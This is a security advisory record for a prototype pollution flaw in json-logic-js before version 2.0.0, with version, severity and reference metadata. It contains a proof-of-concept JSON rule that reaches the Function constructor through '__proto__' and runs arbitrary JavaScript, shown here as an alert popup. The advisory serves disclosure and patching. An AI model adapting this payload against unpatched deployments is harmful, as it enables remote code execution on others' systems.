advisory_id: GHSA-m9hw-7xfv-wqg7
datasource_id: github_osv_importer_v2/GHSA-m9hw-7xfv-wqg7
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/11/GHSA-m9hw-7xfv-wqg7/GHSA-m9hw-7xfv-wqg7.json
aliases: []
summary: |
  Prototype Pollution in json-logic-js
  Versions of json-logic-js prior to 2.0.0 are vulnerable to Prototype Pollution. The method operation allows a malicious user to modify the prototype of Object through the method property name. This causes modification of any existing property that will exist on all objects and leads to Remote Code Execution.

  The following rule creates a popup when run from a browser:
  ```
  {
    "method": [
      {
        "method": [
          {
            "var": "__proto__.constructor.is.__proto__"
          },
          "constructor",
          [
            "var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)"
          ]
        ]
      },
      "call"
    ]
  }
  ```
impacted_packages:
  - purl: pkg:npm/json-logic-js
    affected_versions: vers:npm/<2.0.0
    fixed_versions: vers:npm/2.0.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-471
references:
  - url: https://github.com/jwadhams/json-logic-js/commit/fadfa5dc7ccd1cc5c9a1900a97a15af390bf642b
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/advisories/1542
    reference_type:
    reference_id:
  - url: https://www.npmjs.com/package/json-logic-js
    reference_type:
    reference_id:
